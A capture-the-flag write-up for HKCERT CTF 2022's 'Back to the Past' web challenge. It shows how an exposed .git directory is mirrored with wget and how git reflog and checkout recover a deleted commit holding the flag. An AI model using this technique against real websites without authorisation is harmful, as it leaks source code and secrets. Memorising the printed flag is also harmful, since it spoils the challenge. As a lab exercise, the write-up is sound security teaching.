# Back to the Past

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

- Challenge difficulty: ★☆☆☆☆

## Background

Web: [http://chal.hkcert22.pwnable.hk:28222](http://chal.hkcert22.pwnable.hk:28222)

Solution: [https://hackmd.io/@blackb6a/hkcert-ctf-2022-ii-en-6a196795](https://hackmd.io/@blackb6a/hkcert-ctf-2022-ii-en-6a196795)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221111215817.png)

## Find the flag

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221111215846.png)

**View-source:**
```html
<html>
<head>
    <title>Welcome</title>
</head>

<body style="background: black; color: white;">
    <h1 style="text-align:center;">Welcome to my home page!</h1>

    <p style="text-align:center;"><a href="https://www.youtube.com/watch?v=o1UcRXTXmN4><img src="img/door.png" height="200" class="center"
[...]
```

**Let's explore this web page!**

When I click the door, it brings me to a YouTube video, which is not helpful.

**However, when I go to `/img` directory, I see a picture file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221111220053.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221111220057.png)

403 Forbidden...

Since the challenge's name is `Back to the Past`, this got me thinking: **Is this website being pushed via `git`?**

**If so, it might have a directory call `.git`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221111220207.png)

**Boom! Let's `wget` all the files!**
```
┌──(root🌸siunam)-[~/ctf/HKCERT-CTF-2022/Web/Back-to-the-Past]
└─# mkdir .git;cd .git            
                                                                                                           
┌──(root🌸siunam)-[~/…/HKCERT-CTF-2022/Web/Back-to-the-Past/.git]
└─# wget -r http://chal.hkcert22.pwnable.hk:28222/.git/

┌──(root🌸siunam)-[~/…/Web/Back-to-the-Past/.git/chal.hkcert22.pwnable.hk:28222]
└─# ls -lah            
total 20K
drwxr-xr-x 4 root root 4.0K Nov 11 22:03 .
drwxr-xr-x 3 root root 4.0K Nov 11 22:03 ..
drwxr-xr-x 8 root root 4.0K Nov 11 22:03 .git
drwxr-xr-x 2 root root 4.0K Nov 11 22:03 img
-rw-r--r-- 1 root root 1.8K Oct 25 10:34 index.html
```

**Since it's a `.git` directory, we can view it's logs and commits!**
```
┌──(root🌸siunam)-[~/…/Web/Back-to-the-Past/.git/chal.hkcert22.pwnable.hk:28222]
└─# git log
commit 77fe6ae33755cbac75cf2bf00014a9e4b2f08903 (HEAD -> master)
Author: Holland Wan <noreply@noreply.com>
Date:   Fri Oct 21 22:48:35 2022 +0800

    Final webpage

commit a9c248a136bb24592cfe1dd14805dde9da321c4d
Author: Holland Wan <noreply@noreply.com>
Date:   Fri Oct 21 22:38:59 2022 +0800

    Initial

┌──(root🌸siunam)-[~/…/Web/Back-to-the-Past/.git/chal.hkcert22.pwnable.hk:28222]
└─# git reflog 
77fe6ae (HEAD -> master) HEAD@{0}: commit: Final webpage
a9c248a HEAD@{1}: reset: moving to a9c248a136bb24592cfe1dd14805dde9da321c4d
4ba5380 HEAD@{2}: commit: What is this?
a9c248a HEAD@{3}: commit (initial): Initial
```

**The `What is this?` commit looks sussy!**

**Let's `checkout` that commit!**
```
┌──(root🌸siunam)-[~/…/Web/Back-to-the-Past/.git/chal.hkcert22.pwnable.hk:28222]
└─# git checkout 4ba5380 -f
```

```
┌──(root🌸siunam)-[~/…/Web/Back-to-the-Past/.git/chal.hkcert22.pwnable.hk:28222]
└─# ls -lah
total 16K
drwxr-xr-x 3 root root 4.0K Nov 11 22:07 .
drwxr-xr-x 3 root root 4.0K Nov 11 22:03 ..
-rw-r--r-- 1 root root   52 Nov 11 22:07 flag.txt
drwxr-xr-x 8 root root 4.0K Nov 11 22:07 .git
                                                                                                           
┌──(root🌸siunam)-[~/…/Web/Back-to-the-Past/.git/chal.hkcert22.pwnable.hk:28222]
└─# cat flag.txt                     
hkcert22{n0stalgic_w3bs1t3_br1ings_m3_b4ck_to_2000}
```

We got the flag!

# Conclusion

What we've learned:

1. Insecurely Storing Files